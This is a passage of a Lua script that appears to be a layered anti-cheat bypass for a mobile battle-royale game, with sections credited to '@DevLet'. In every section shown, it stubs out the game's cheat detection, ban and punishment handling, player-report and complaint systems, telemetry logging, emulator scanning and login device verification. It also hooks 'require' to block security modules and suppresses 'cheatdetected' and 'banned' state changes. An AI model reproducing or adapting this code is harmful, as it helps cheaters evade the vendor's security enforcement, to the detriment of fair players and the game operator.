            local blockedRPC = {"RPC_Server_ClientSecMrpcsFlow", "RPC_Server_SwiftHawk", "RPC_Server_ClientSwiftHawkWithParams", "RPC_Server_ReportSimulateCharacterLocation", "RPC_Client_ShootVertifyRes", "RPC_ClientCoronaLab"}
            _G.SendRPC = function(rpcName, ...) for _, b in ipairs(blockedRPC) do if rpcName == b then return nil end end; return origRPC(rpcName, ...) end
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 16: HIGGS BOSON BYPASS (@DevLet) =============
-- ==============================================================================
local function InitializeHiggsBosonBypass()
    pcall(function()
        local Higgs = require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if Higgs then
            for _, m in ipairs({"ControlMHActive", "Tick", "OnTick", "MHActiveLogic", "TriggerAvatarCheck", "StartAvatarCheck", "ReportItemID", "ReceiveAnyDamage", "OnWeaponHitRecord", "ShowSecurityAlert", "ServerReportAvatar", "ClientReportNetAvatar", "SendHisarData", "ValidateSecurityData", "StaticShowSecurityAlertInDev", "RPC_Client_ShootVertifyRes", "RPC_Server_ReportSimulateCharacterLocation", "DisableHiggsBoson", "CheckMHActive", "ReportViolation", "ProcessSecurityEvent", "ValidatePlayer", "CheckIntegrity"}) do
                if Higgs[m] then Higgs[m] = nop end
            end
            Higgs.GetNetAvatarItemIDs = retEmpty; Higgs.GetCurWeaponSkinID = retZero; Higgs.IsMHActive = retFalse; Higgs.bMHActive = false; Higgs.bCallPreReplication = false
            if Higgs.BlackList then for k in pairs(Higgs.BlackList) do Higgs.BlackList[k] = nil end end
        end
        _G.BlackList = {}
        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if slua.isValid(pc) then
            if pc.HiggsBoson then pc.HiggsBoson.bMHActive = false; pc.HiggsBoson.bCallPreReplication = false; if pc.HiggsBoson.ControlMHActive then pc.HiggsBoson:ControlMHActive(0) end end
            if pc.HiggsBosonComponent then pc.HiggsBosonComponent.bMHActive = false; pc.HiggsBosonComponent.bCallPreReplication = false; pc.HiggsBosonComponent:ControlMHActive(0) end
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 17: ANTI CHEAT HOOKS (@DevLet) ===============
-- ==============================================================================
local function InitializeAntiCheatHooks()
    pcall(function()
        local HBC = require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if HBC and HBC.StaticShowSecurityAlertInDev then HBC.StaticShowSecurityAlertInDev = nop end
    end)
    if _G.AvatarCheckCallback then
        _G.AvatarCheckCallback.StartAvatarCheck = nop; _G.AvatarCheckCallback.OnReportItemID = nop
        _G.AvatarCheckCallback.PostPlayerControllerLoginInit = function(PlayerController)
            if slua.isValid(PlayerController) and PlayerController.HiggsBosonComponent then PlayerController.HiggsBosonComponent:ControlMHActive(0); PlayerController.HiggsBosonComponent.bMHActive = false end
        end
    end
end

-- ==============================================================================
-- ============== LAYER 18: ANTI REPORT (@DevLet) ====================
-- ==============================================================================
local function InitializeAntiReport()
    pcall(function()
        for _, path in ipairs({"GameLua.Mod.BaseMod.Client.Security.ClientReportPlayerSubsystem", "Client.Security.ClientReportPlayerSubsystem", "GameLua.Mod.BaseMod.DS.Security.DSReportPlayerSubsystem"}) do
            local sub = package.loaded[path]; if not sub then local s, r = pcall(require, path); if s and r then sub = r end end
            if sub then for k, v in pairs(sub) do if type(v) == "function" and (k:find("Report") or k:find("Record") or k:find("Send") or k:find("Upload") or k:find("Notify")) then pcall(function() sub[k] = nop end) end end end
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 19: GAMEPLAY BYPASS (@DevLet) ================
-- ==============================================================================
local function InitializeGameplayBypass()
    pcall(function()
        if not _G.GameplayCallbacks then _G.GameplayCallbacks = {} end
        if _G.GameplayCallbacks.IsBypassed then return end
        local GC = _G.GameplayCallbacks
        local reports = {"ReportAttackFlow", "ReportSecAttackFlow", "ReportFireArms", "ReportVerifyInfoFlow", "ReportMrpcsFlow", "ReportPlayerBehavior", "ReportTeammatHurt", "ReportMisKillByTeammate", "ReportForbitPick", "ReportPlayerMoveRoute", "ReportPlayerPosition", "ReportVehicleMoveFlow", "ReportSecTgameMovingFlow", "ReportParachuteData", "SendTssSdkAntiDataToLobby", "ReportEquipmentFlow", "ReportAimFlow", "ReportPlayersPing", "ReportPlayerIP", "ReportPlayerFramePingRecord", "OnDSConnectionSaturated", "ReportDSNetSaturation", "ReportNetContinuousSaturate", "ReportDSNetRate", "SendClientStats", "SendServerAvgTickDelta", "ReportCircleFlow", "ClientSecMrpcsFlow", "SwiftHawk", "ClientSwiftHawk", "ClientSwiftHawkWithParams"}
        for _, f in ipairs(reports) do GC[f] = nop end
        GC.CheckReportSecAttackFlowWithAttackFlow = retFalse; GC.CheckReportSecAttackFlow = retFalse
        local origState = GC.OnDSPlayerStateChanged
        GC.OnDSPlayerStateChanged = function(UID, State, bPure, bSafe, Param)
            local s = State and string.lower(tostring(State)) or ""
            local blocked = {["cheatdetected"]=1, ["connectionlost"]=1, ["connectiontimeout"]=1, ["connectionexception"]=1, ["netdrivererror"]=1, ["banned"]=1, ["kicked"]=1, ["suspended"]=1, ["violationdetected"]=1, ["integrityfailure"]=1, ["securityviolation"]=1}
            if blocked[s] then return end
            if origState then pcall(origState, UID, State, bPure, bSafe, Param) end
        end
        GC.OnPlayerNetConnectionClosed = nop; GC.OnPlayerActorChannelError = nop; GC.OnPlayerRPCValidateFailed = nop; GC.OnPlayerSpectateException = nop; GC.OnShutdownAfterError = nop; GC.IsBypassed = true
    end)
end

-- ==============================================================================
-- ============== LAYER 20: KILL ALL SUBSYSTEMS (@DevLet) ============
-- ==============================================================================
local function InitializeKillAllSubsystems()
    pcall(function()
        local subMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if not subMgr then return end
        local toKill = {"CoronaLabSubsystem", "PlayerSecurityInfoSubsystem", "ClientCircleFlowSubsystem", "ModifierExceptionSubsystem", "SimulateCharacterSubsystem", "ShootVerifySubSystemClient", "HiggsBosonComponent", "ClientReportPlayerSubsystem", "DSReportPlayerSubsystem", "ClientHawkEyePatrolSubsystem", "DSHawkEyePatrolSubsystem", "ClientDataStatistcsSubsystem", "AFKReportorSubsystem", "BehaviorScoreSubsystem", "FileCheckSubsystem", "MemoryCheckSubsystem", "SpeedCheckSubsystem", "WallCheckSubsystem", "AvatarExceptionSubsystem", "GameReportSubsystem", "ClientSecMrpcsFlowSubsystem", "MrpcsFlowSubsystem", "CircleFlowSubsystem", "SwiftHawkSubsystem", "AntiCheatSubsystem", "IntegrityCheckSubsystem", "SignatureVerifySubsystem", "MD5CheckSubsystem", "PakVerifySubsystem"}
        for _, name in ipairs(toKill) do
            local sub = subMgr:Get(name)
            if sub then
                for k, v in pairs(sub) do if type(v) == "function" and (k:find("Report") or k:find("Send") or k:find("Upload") or k:find("Verify") or k:find("Check") or k:find("Validate") or k:find("Scan") or k:find("Detect") or k:find("Collect") or k:find("Flow") or k:find("Heartbeat")) then pcall(function() sub[k] = nop end) end end
                if sub.timer then pcall(function() sub:RemoveGameTimer(sub.timer) end) end
                if sub.heartbeatTimer then pcall(function() sub:RemoveGameTimer(sub.heartbeatTimer) end) end
                if sub.reportTimer then pcall(function() sub:RemoveGameTimer(sub.reportTimer) end) end
            end
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 21: FINAL PROTECTION (@DevLet) ===============
-- ==============================================================================
local function InitializeFinalProtection()
    pcall(function()
        for _, flag in ipairs({"ENABLE_REPORT", "ENABLE_ANTI_CHEAT", "ENABLE_SECURITY", "ENABLE_TELEMETRY", "ENABLE_ANALYTICS", "ENABLE_CRASH_REPORT", "ENABLE_PERFORMANCE_REPORT"}) do if _G[flag] then _G[flag] = false end end
        local origReq = require
        local blocked = {"HiggsBosonComponent", "PlayerSecurityInfoSubsystem", "CoronaLabSubsystem", "ClientCircleFlowSubsystem", "ModifierExceptionSubsystem", "ShootVerifySubSystemClient", "ClientReportPlayerSubsystem", "DSReportPlayerSubsystem"}
        _G.require = function(m) for _, b in ipairs(blocked) do if m:find(b) then return {} end end; return origReq(m) end
    end)
end

-- ==============================================================================
-- ============== LAYER 22: OPERATIONAL STATS BYPASS (Extra) ====================
-- ==============================================================================
local function InitializeOperationalStatsBypass()
    pcall(function()
        local subMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        local OperationalStatsSubsystem = (subMgr and subMgr:Get("OperationalStatsSubsystem")) or _G.OperationalStatsSubsystem
        if OperationalStatsSubsystem then
            OperationalStatsSubsystem.ReportOperationalStats = nop
            OperationalStatsSubsystem.AddOperationalStats = nop
            OperationalStatsSubsystem.HandleTouchBegin = nop
            OperationalStatsSubsystem.HandleTouchEnd = nop
            OperationalStatsSubsystem.OnInit = nop
            OperationalStatsSubsystem.HandleEnterFighting = nop
            OperationalStatsSubsystem.OnBattleResult = nop
            if OperationalStatsSubsystem.TimerHandle then
                pcall(function() OperationalStatsSubsystem:RemoveGameTimer(OperationalStatsSubsystem.TimerHandle) end)
                OperationalStatsSubsystem.TimerHandle = nil
            end
            OperationalStatsSubsystem.StatsData = {}
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 23: BYPASS BASE (From First Bypass) =====================
-- ==============================================================================
local function InitializeBypassBase()
    pcall(function()
        local stExtra = import("STExtraBlueprintFunctionLibrary")
        if stExtra and stExtra.IsDevelopment then stExtra.IsDevelopment = nop end
        if Client then Client.IsDevelopment = nop; Client.IsShipping = retFalse end
        if Server then Server.IsShipping = retFalse end

        local ToolReport = safe_require("client.slua.logic.report.ToolReportUtil")
        if ToolReport then
            ToolReport.IsReleaseVersion = retFalse
            ToolReport.IsWhite = retFalse
            ToolReport.GetReportSwitch = retFalse
        end

        local callbacks = _G.GameplayCallbacks or _G.GC
        if callbacks then
            local kills = {
                "SendTssSdkAntiDataToLobby","SendDSErrorLogToLobby","SendDSHawkEyePatrolLogToLobby",
                "SendSecTLog","SendDataMiningTLog","SendActivityTLog","SendClientMemUsage","SendClientFPS",
                "OnClientCrashReport","OnNetworkLossDetected","ReportMatchRoomData","ReportPlayersPing",
                "SendClientStats","SendServerAvgTickDelta","ReportHitFlow","OnPlayerActorChannelError","OnPlayerRPCValidateFailed"
            }
            for _, fn in ipairs(kills) do
                if callbacks[fn] then callbacks[fn] = nop end
            end
            local origDS = callbacks.OnDSPlayerStateChanged
            if origDS then
                callbacks.OnDSPlayerStateChanged = function(dsSelf, state, reason, ...)
                    if tostring(reason):lower():find("cheatdetected") then return end
                    pcall(origDS, dsSelf, state, reason, ...)
                end
            end
        end

        if _G.TApmHelper then _G.TApmHelper.postEvent = nop end

        local PC = _G.PacketCallbacks
        if PC then
            PC.player_report_cheat = nop
            PC.upload_loots_rsp = nop
            PC.watch_player_exit = nop
            PC.player_login_report = nop
            PC.player_logout_report = nop
            PC.server_time_report = nop
        end

        local sdm = _G.ServerDataMgr
        if sdm and sdm.DeletablePlayerResultKey then
            sdm.DeletablePlayerResultKey["SuspiciousHitCount"] = true
            sdm.DeletablePlayerResultKey["EspTotalSimTraceCnt"] = true
            sdm.DeletablePlayerResultKey["EspTotalImeFocusCnt"] = true
            sdm.DeletablePlayerResultKey["ClientGravityAnomalyCount"] = true
        end

        local pcNotify = safe_require("GameLua.Mod.BaseMod.Common.Security.SecurityNotifyPCFeature")
        if pcNotify then
            pcNotify.ClientRPC_SyncBanID = nop
            pcNotify.ClientRPC_StrongTips = nop
            pcNotify.ClientRPC_NormalTips = nop
            pcNotify.Notify = nop
            pcNotify.ClientRPC_NotifyBan = nop
            pcNotify.ClientRPC_NotifyPunish = nop
            pcNotify.ClientRPC_NotifyIllegalProgram = nop
        end

        local secUtils = safe_require("GameLua.Mod.BaseMod.Common.Security.SecurityCommonUtils")
        if secUtils and secUtils.EStrategyTypeInReplay then
            secUtils.EStrategyTypeInReplay.EspTotalSimTraceCnt = 0
            secUtils.EStrategyTypeInReplay.EspTotalImeFocusCnt = 0
            secUtils.EStrategyTypeInReplay.ClientGravityAnomalyCount = 0
            secUtils.EStrategyTypeInReplay.FlyingErrorCnt = 0
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 24: HIGGS BYPASS (From First Bypass) ====================
-- ==============================================================================
local function InitializeHiggsBypass()
    pcall(function()
        local Higgs = safe_require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if Higgs then
            local methods = {
                "ControlMHActive","Tick","OnTick","MHActiveLogic","TriggerAvatarCheck","StartAvatarCheck",
                "ReportItemID","ReceiveAnyDamage","OnWeaponHitRecord","ShowSecurityAlert","ServerReportAvatar",
                "ClientReportNetAvatar","SendHisarData","ValidateSecurityData","StaticShowSecurityAlertInDev"
            }
            for _, m in ipairs(methods) do
                if Higgs[m] then Higgs[m] = nop end
            end
            Higgs.GetNetAvatarItemIDs = retEmpty
            Higgs.GetCurWeaponSkinID = retZero
        end
        if _G.DisableHiggsBoson then _G.DisableHiggsBoson = nop end

        local hia = safe_require("GameLua.Mod.BaseMod.Client.Security.ClientGlueHiaSystem")
        if hia then
            hia.CheckHitIntegrity = nop
            hia.InitSession = nop
            hia.OnBattleEnd = nop
        end

        local Behavior = safe_require("GameLua.Mod.Escape.Gameplay.Subsystem.BehaviorScoreSubsystem")
        if Behavior then
            Behavior.OnHandleBehaviorScore = nop
            Behavior.AIPerceptionScore = nop
            Behavior.ReportBehavior = nop
            Behavior.CalcFinalScore = retZero
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 25: BAN SYSTEM BYPASS (From First Bypass) ===============
-- ==============================================================================
local function InitializeBanSystemBypass()
    pcall(function()
        local BanLogic = safe_require("client.slua.logic.ban.ClientBanLogic")
        if BanLogic then
            BanLogic.OnSyncBanInfo = nop; BanLogic.OnVoiceBanNotify = nop
            BanLogic.OnRealTimeVoiceBanNotify = nop; BanLogic.OnVoiceBanSuccess = nop
            BanLogic.OnSyncMicSuspicious = nop; BanLogic.OnSyncMicPreFilter = nop
            BanLogic.OnNotifyWarningTips = nop; BanLogic.ReqBanInfo = nop
        end

        local BanUtil = safe_require("client.common.ban_util") or _G.ban_util
        if BanUtil then
            BanUtil.CheckBanStatus = retFalse
            BanUtil.GetBanTime = retZero
            BanUtil.IsBanForever = retFalse
        end

        local TTBan = safe_require("client.logic.login.logic_tt_ban") or _G.logic_tt_ban
        if TTBan then
            TTBan.CheckIfCanCreateRole = nop
            TTBan.GetCarrierInfo = function() return "[{\"mcc\":\"000\"}]" end
        end

        local GodzillaBan = safe_require("client.network.Protocol.GodzillaBanHandler")
        if GodzillaBan then
            GodzillaBan.send_godzilla_ban_req = nop
            GodzillaBan.send_godzilla_unban_req = nop
        end

        local AntiAddiction = safe_require("client.network.Protocol.AntiaddctionHandler")
        if AntiAddiction then
            AntiAddiction.send_anti_addiction_req = nop
            AntiAddiction.send_anti_addiction_notify = nop
        end

        local AccessRestrict = safe_require("client.network.Protocol.AccessRestrictionHandler")
        if AccessRestrict then
            AccessRestrict.send_access_restriction_req = nop
            AccessRestrict.send_access_restriction_notify = nop
            AccessRestrict.on_player_cheat_state_notify = nop
        end

        local DeleteAccount = safe_require("client.slua.logic.gdpr.logic_deleteaccount")
        if DeleteAccount then
            DeleteAccount.ForceDeleteAccount = retFalse
            DeleteAccount.OnReceiveDeleteNotify = nop
        end

        local ComplianceUtil = safe_require("client.slua.logic.gdpr.compliance_util")
        if ComplianceUtil then ComplianceUtil.CheckCompliance = nop end
    end)
end

-- ==============================================================================
-- ============== LAYER 26: REPORT SYSTEMS BYPASS (From First Bypass) ===========
-- ==============================================================================
local function InitializeReportSystemsBypass()
    pcall(function()
        local clientReport = safe_require("GameLua.Mod.BaseMod.Client.Security.ClientReportPlayerSubsystem")
        if clientReport then
            local funcs = {"OnInit","_OnPlayerKilledOtherPlayer","_RecordFatalDamager","SendPacket","ReportSuspiciousPlayer","SubmitReport","_OnBattleResult","_RecordTeammatePlayerInfo","_OnDeathReplayDataWhenFatalDamaged","_RecordMurdererFromDeathReplayData"}
            for _, fn in ipairs(funcs) do
                if clientReport[fn] then clientReport[fn] = nop end
            end
        end

        local dsReport = safe_require("GameLua.Mod.BaseMod.Common.Security.DSReportPlayerSubsystem")
        if dsReport then
            local funcs = {"_OnNearDeathOrRescued","_OnPlayerSettlementStart","_OnTeammateDamage","_OnCharacterDied","_AddEnemyMapToBattleResult","_AddTeammateMapToBattleResult","_SubmitAbnormalData"}
            for _, fn in ipairs(funcs) do
                if dsReport[fn] then dsReport[fn] = nop end
            end
        end

        local reportUtils = safe_require("GameLua.Mod.BaseMod.Common.Security.ReportPlayerUtils")
        if reportUtils then
            reportUtils.GetBotType = retZero
            reportUtils.IsCharacterDeliverAI = retFalse
        end

        local AvatarSub = safe_require("GameLua.Mod.Library.GamePlay.Avatar.Exception.AvatarExceptionSubsystem")
        if AvatarSub then
            AvatarSub.OnClickReportCheckAvatar = nop
            AvatarSub.RegisterTickCheckCharacterAvatar = nop
        end

        if _G.AvatarExceptionPlayerInst then
            _G.AvatarExceptionPlayerInst.ReportAvatarException = nop
            _G.AvatarExceptionPlayerInst.CheckAvatarException = nop
            _G.AvatarExceptionPlayerInst.CheckCanBugglyPostException = nop
        end

        local SubsystemMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubsystemMgr then
            local hawk = SubsystemMgr:Get("DSHawkEyePatrolSubsystem")
            if hawk then hawk.MarkSuspiciousPlayer = nop end
        end

        if _G.DSHawkEyePatrolSubsystem then
            _G.DSHawkEyePatrolSubsystem._OnHawkReport = nop
            _G.DSHawkEyePatrolSubsystem._OnHawkImprison = nop
            _G.DSHawkEyePatrolSubsystem.CheckPunishPlayer = nop
        end

        local ClientHawk = safe_require("GameLua.Mod.BaseMod.Client.Security.ClientHawkEyePatrolSubsystem")
        if ClientHawk then
            local funcs = {"_OnHawkSync","_OnHawkReportSuccess","_StartExitGameTimer","_OnRecvInspectorBroadcastCount","SendReportTLog","ReportCheat"}
            for _, fn in ipairs(funcs) do
                if ClientHawk[fn] then ClientHawk[fn] = nop end
            end
            ClientHawk.CanInspectorBroadcast = retFalse
        end

        local InspectClient = safe_require("GameLua.Mod.BaseMod.Client.Security.InspectionSystemReportClientLogicSubsystem")
        if InspectClient then
            local funcs = {"AskForInspector","ReportEnemy","KickOutOneTeam","OnReceiveInspectCmd","ClientReportData","SendReportToInspector","SendKickOutOneTeam","ClientNotifyInspectorImplementation","RecvNotifyInspector"}
            for _, fn in ipairs(funcs) do
                if InspectClient[fn] then InspectClient[fn] = nop end
            end
        end

        local InspectDS = safe_require("GameLua.Mod.BaseMod.DS.Security.InspectionSystemReportDSLogicSubsystem")
        if InspectDS then
            local funcs = {"ServerKickOutOneTeamByPlayerImplementation","AddReportedCount","AddInspectionRecord","BanPlayerByInspection","BroadCastToAllInspector","ServerReportToInspectorImplementation","InitPlayerInspectionInfo"}
            for _, fn in ipairs(funcs) do
                if InspectDS[fn] then InspectDS[fn] = nop end
            end
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 27: TLOG BYPASS (From First Bypass) =====================
-- ==============================================================================
local function InitializeTLogBypass()
    pcall(function()
        local tlogMods = {
            "client.network.Protocol.ClientTlogHandler","client.network.Protocol.BattleReportHandler",
            "client.network.Protocol.ClientErrorReportHandler","client.network.Protocol.LobbyPingReportHandler",
            "client.slua.config.tlog.tlog_report_utils","client.slua.data.BasicData.BasicDataTLogReport",
            "client.slua.data.BasicData.BasicDataClientReport","client.slua.data.BasicData.BasicDataReport",
            "GameLua.Mod.BaseMod.DS.Security.DSCommonTLogSubsystem","GameLua.Mod.BaseMod.DS.Security.DSFightTLogSubsystem",
            "GameLua.Mod.BaseMod.DS.Security.DSSecurityTLogSubsystem","GameLua.Mod.BaseMod.Client.Security.ClientDataStatistcsSubsystem"
        }
        for _, path in ipairs(tlogMods) do
            local mod = package.loaded[path]
            if mod then
                for k, v in pairs(mod) do
                    if type(v) == "function" and (k:find("Log") or k:find("Report") or k:find("Send") or k:find("Tlog")) then
                        pcall(function() mod[k] = nop end)
                    end
                end
            end
        end

        local AmphibiousBoat = safe_require("GameLua.GameCore.Module.Vehicle.VehicleFeatures.TLog.AmphibiousBoatTLogFeature")
        if AmphibiousBoat then
            AmphibiousBoat.RecordMovement = nop
            AmphibiousBoat.StartRecordMovement = nop
        end

        local ICTLog = safe_require("GameLua.Mod.BaseMod.DS.Security.ICTLogSubsystem")
        if ICTLog then ICTLog.SendICExceptionTLog = nop end

        local DSFight = safe_require("GameLua.Mod.BaseMod.DS.Security.DSFightTLogSubsystem")
        if DSFight then
            DSFight.GetSimpleFightData = retEmpty
            DSFight.ReportFightData = nop
            DSFight.ReportPlayerWeapon = nop
        end

        local DSSec = safe_require("GameLua.Mod.BaseMod.DS.Security.DSSecurityTLogSubsystem")
        if DSSec then
            DSSec._OnReportServerJumpFlow = nop
            DSSec._OnReportTeleportFlow = nop
            DSSec._OnReportSpeedHackFlow = nop
        end

        local DSCommon = safe_require("GameLua.Mod.BaseMod.DS.Security.DSCommonTLogSubsystem")
        if DSCommon then DSCommon.HandleKillTlog = nop end

        local PufferTlog = safe_require("client.slua.logic.download.report.puffer_tlog")
        if PufferTlog then PufferTlog.report_download_tlog = nop end
    end)
end

-- ==============================================================================
-- ============== LAYER 28: NETWORK HANDLERS BYPASS (From First Bypass) =========
-- ==============================================================================
local function InitializeNetworkHandlersBypass()
    pcall(function()
        local ClientError = safe_require("client.network.Protocol.ClientErrorReportHandler")
        if ClientError then
            ClientError.send_client_error_report = nop
            ClientError.send_client_crash_report = nop
            ClientError.send_client_tools_batch_report_req = nop
        end

        local BattleReport = safe_require("client.network.Protocol.BattleReportHandler")
        if BattleReport then
            for _, fn in ipairs({"send_battle_report","send_battle_result","send_vod_game_report_req","send_batch_get_vod_info_req","send_get_game_report_req","send_batch_get_game_report_req","send_get_game_report_by_uid_req"}) do
                if BattleReport[fn] then BattleReport[fn] = nop end
            end
        end

        local BugHandler = safe_require("client.network.Protocol.BugHandler")
        if BugHandler then
            BugHandler.send_report_bug_info = nop
            BugHandler.send_report_bug_feedback = nop
        end

        local PingReport = safe_require("client.network.Protocol.LobbyPingReportHandler")
        if PingReport then
            PingReport.send_lobby_ping_report = nop
            PingReport.send_ingame_ping_report = nop
        end

        local WeekReport = safe_require("client.network.Protocol.WeekRportHandler")
        if WeekReport then
            WeekReport.send_week_report = nop
            WeekReport.send_week_detail = nop
        end

        local LogicComplaint = safe_require("client.logic.battle.logic_complaint")
        if LogicComplaint then
            LogicComplaint.SendComplaintReq = nop
            LogicComplaint.Submit = nop
            LogicComplaint.ReportPlayer = nop
            LogicComplaint.ShowComplaint = nop
            LogicComplaint.ShowHandle = nop
        end

        local OBResult = safe_require("GameLua.Mod.BaseMod.Client.BattleResult.ProcessBase.EscapeBattleResultShowOBResultLogic")
        if OBResult then
            OBResult.OnBattleResult = nop
            OBResult.OnResultProcessStart = nop
        end

        local NormalOBResult = safe_require("GameLua.Mod.BaseMod.Client.BattleResult.ProcessBase.BattleResultShowOBResultLogic")
        if NormalOBResult then
            NormalOBResult.OnBattleResult = nop
            NormalOBResult.OnResultProcessStart = nop
        end

        local ShowResult = safe_require("GameLua.Mod.BaseMod.Client.BattleResult.ProcessBase.BattleResultShowResultLogic")
        if ShowResult then
            for _, fn in ipairs({"OnBattleResult","OnResultProcessStart","OnResultProcessContinue","ReceiveData","SendEndFlow","OnReport","ShowResult","ShowResultInternal","StopResultProcess"}) do
                if ShowResult[fn] then ShowResult[fn] = nop end
            end
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 29: MISC BYPASS (From First Bypass) =====================
-- ==============================================================================
local function InitializeMiscBypass()
    pcall(function()
        local EmuHandler = safe_require("client.network.Protocol.EmulatorHandler")
        if EmuHandler then EmuHandler.send_emulator_info = nop end

        local EmuScanner = safe_require("client.logic.login.emulator_scanner")
        if EmuScanner then
            EmuScanner.StartScan = nop
            EmuScanner.GetScanResult = retFalse
            EmuScanner.ReportScanResult = nop
        end

        local LoginVerify = safe_require("client.network.Protocol.LoginVerifyHandler")
        if LoginVerify then
            LoginVerify.send_login_verify_req = nop
            LoginVerify.send_device_verify_req = nop
        end

        local DSMonitor = safe_require("client.logic.data.logic_ds_monitor")
        if DSMonitor then
            DSMonitor.OnRecordMsg = nop
            DSMonitor.OnReportMsg = nop
        end

        local ClientDataStat = safe_require("GameLua.Mod.BaseMod.Client.Security.ClientDataStatistcsSubsystem")
        if ClientDataStat then
            ClientDataStat.StartToCheck = nop
            ClientDataStat.OnReceiveRTT = nop
            ClientDataStat.OnReceiveJitter = nop
            ClientDataStat.ReportAbnormal = nop
            ClientDataStat.ResetData = nop
        end

        local shootVerify = safe_require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if shootVerify then
            shootVerify.OnShootVerifyFailed = nop
            shootVerify.SendVerifyData = nop
        end

        local HighlightDS = safe_require("GameLua.Mod.BaseMod.DS.Security.HighlightMomentSubsystem_DSChecker")
        if HighlightDS then HighlightDS.CheckFuncUpgradedWeaponKill = nop end

        local ProfileReport = safe_require("client.logic.data.profile_report_cfg")
        if ProfileReport then ProfileReport.SendReport = nop end

        local VoiceReport = safe_require("client.slua.logic.chat_voice.logic_chat_voice_report")
        if VoiceReport then
            VoiceReport.ReportVoiceData = nop
            VoiceReport.ReportVoiceText = nop
        end

        local VoiceDoctor = safe_require("client.slua.logic.chat_voice.logic_chat_voice_doctor")
        if VoiceDoctor then
            VoiceDoctor.UploadVoiceLog = nop
            VoiceDoctor.UploadVoiceException = nop
        end

        local HomeAudit = safe_require("client.slua.logic.home.Audit.logic_home_audit_state")
        if HomeAudit then
            HomeAudit.SendAuditState = nop
            HomeAudit.ReportAuditResult = nop
        end

        local HomeReport = safe_require("client.slua.logic.home.logic_home_report")
        if HomeReport then
            HomeReport.ReportHomeData = nop
            HomeReport.ReportHomeVisitor = nop
        end

        local GemReport = safe_require("client.logic.store.gem_report_utils")
        if GemReport then
            GemReport.ReportGemData = nop
            GemReport.ReportGemPurchase = nop
        end

        local SafeStation = safe_require("client.slua.logic.CustomerService.LogicSafeStation")
        if SafeStation then
            SafeStation.UploadVideoEvidence = nop
            SafeStation.ReportPlayerBehavior = nop
        end

        local CustomerService = safe_require("client.slua.logic.CustomerService.LogicCustomerService")
        if CustomerService then
            CustomerService.SendComplaint = nop
            CustomerService.SendFeedback = nop
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 30: EXTRA SUBSYSTEMS BYPASS (From First Bypass) =========
-- ==============================================================================
local function InitializeExtraSubsystemsBypass()
    pcall(function()
        local znq6Revive = safe_require("GameLua.Mod.TDEvent.ZNQ6th.DS.ZNQ6thDSReviveSubsystem")
        if znq6Revive then znq6Revive.HaveNewItemForRevive = nop end

        local znq7Revive = safe_require("GameLua.Mod.TDEvent.ZNQ7th.DS.ZNQ7DSReviveSubsystem")
        if znq7Revive then znq7Revive.HaveChanceRevival = nop end

        local DataLayer = safe_require("GameLua.Mod.BaseMod.Common.Subsystem.DataLayerSubsystem")
        if DataLayer then
            local orig = DataLayer.OnSpectatorReplayChanged
            if orig then
                DataLayer.OnSpectatorReplayChanged = function(dlSelf)
                    _G.IsBeingWatched = true
                    orig(dlSelf)
                end
            end
        end

        local DSActive = safe_require("GameLua.Mod.PlanBT.Gameplay.Subsystem.DSActiveSubsystem")
        if DSActive then
            DSActive.DelayKickOutPlayer = nop
            DSActive.ActiveKickNotify = nop
        end

        local CreativeDev = safe_require("GameLua.Mod.CreativeBase.Gameplay.Subsystem.CreativeDevDebugSubsystem")
        if CreativeDev then CreativeDev.IsDebugPanelEnalbedCli = nop end

        local CreativeDeath = safe_require("GameLua.Mod.CreativeBase.Gameplay.Subsystem.CreativeModeDeathRecordSubsystem")
        if CreativeDeath then CreativeDeath.OnPlayerKilled = nop end

        if _G.ClientReplayDataReporter then
            _G.ClientReplayDataReporter.ReportIntArrayData = nop
            _G.ClientReplayDataReporter.ReportFloatArrayData = nop
        end

        local SpectateReplay = safe_require("GameLua.Mod.BaseMod.Common.Subsystem.SpectateAndReplaySubsystem")
        if SpectateReplay then
            SpectateReplay.RequestGotoSpectatingImp = nop
            SpectateReplay.RequestGotoSpectating = nop
        end

        local AIReplay = safe_require("GameLua.ExtraModule.MLAI.Client.AIReplaySubsystem")
        if AIReplay then
            AIReplay.ReportAllPlayerInfo = nop
            AIReplay.ReportFrameData = nop
            AIReplay.ReportPlayerInput = nop
            if AIReplay.uCompletePlayBack then
                AIReplay.uCompletePlayBack.AddRecordMLAIInfo = nop
                AIReplay.uCompletePlayBack.StopRecording = nop
            end
        end

        local AITracking = safe_require("GameLua.Mod.BaseMod.GamePlay.AI.AITrackingLogSubsystem")
        if AITracking then
            AITracking.RealLogoutTimer = nop
            AITracking.LogQueue = {}
            AITracking.AddToLogQue = nop
            AITracking.DoPrint = nop
            AITracking.OnAIPawnDied = nop
            AITracking.OnAIPawnReceiveDamage = nop
            AITracking.OnAIPawnEnemyChange = nop
        end

        local AFKReport = safe_require("GameLua.Mod.BaseMod.DS.Security.AFKReportorSubsystem")
        if AFKReport then
            AFKReport.HandleEnterFighting = nop
            AFKReport.InitializePlayerInputInfo = nop
            AFKReport.AddOneAFKInfo = nop
            AFKReport.SetPlayerAFKState = nop
            AFKReport.ResetPlayerInputInfo = nop
            AFKReport.PlayerHaveAction = nop
        end

        local TDMAFK = safe_require("GameLua.Mod.TDM.Gameplay.Subsystem.TDMAFKReportorSubsystem")
        if TDMAFK then
            TDMAFK.SendAFKTips = nop
            TDMAFK.OnHandleLostConnection = nop
        end

        local DataMgr = safe_require("client.slua.logic.data.data_mgr")
        if DataMgr then DataMgr.GetWeaponSkinSoundVolumeInfoByGroup = retZero end

